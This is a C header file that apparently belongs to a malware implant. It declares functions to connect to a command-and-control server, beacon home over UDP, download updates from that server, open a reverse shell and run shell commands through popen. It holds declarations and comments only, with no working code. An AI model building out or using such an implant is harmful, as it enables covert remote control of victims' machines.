#ifndef UTILS_H
#define UTILS_H

#include "../include/types.h"

#define EXIT_COMMAND "exit\n"

/** 
 * Create the socket to connect to the CC server
 * 
 * It connects to the command and control server.
 * 
 * ip_addr - String with ip address of the listener
 * port - int where the port goes.
 * socket_desc - ???
 * server - to save the socket struct
 * 
 * Returns - OK or ERROR
*/
int connect_cc(char *ip_adrr, int port, int *socket_desc,
	       struct sockaddr_in *server, int isTCP);

/** 
 * Sends some data through UDP
 * 
 * Connects to the command and cotrol server and sends data
 * 
 * ip_addr - String with ip address of the listener
 * port - int where the port goes.
 * 
 * Returns - OK or ERROR
*/
int ping_home(char *ip_addr, int port);

/** 
 * Update downloader
 * 
 * It downloads updates from CC server
 * 
 * ip_addr - String with ip address of the listener
 * port - int where the port goes.
 * 
 * Returns - OK or ERROR
*/
int download_update(char *ip_addr, int port);

/** 
 * Reverse shell using exec
 * 
 * It has the same limitations as exec. You can end the reverse shell by typing exit.
 * 
 * ip_addr - String with ip address of the listener
 * port - int where the port goes.
 * 
 * Returns - OK or ERROR
*/
int reverse_shell(char *ip_addr, int port);

/** 
 * Wrapper for popen
 * 
 * Should be able to execute basic commands on the shell. Same as if you used them directly on popen.
 * 
 * Command - String with the command to execute
 * Output - String where the output of the command is saved. Memory is allocated inside.
 * 
 * Returns - OK or ERROR
*/
int exec(char *command, char **output);

#endif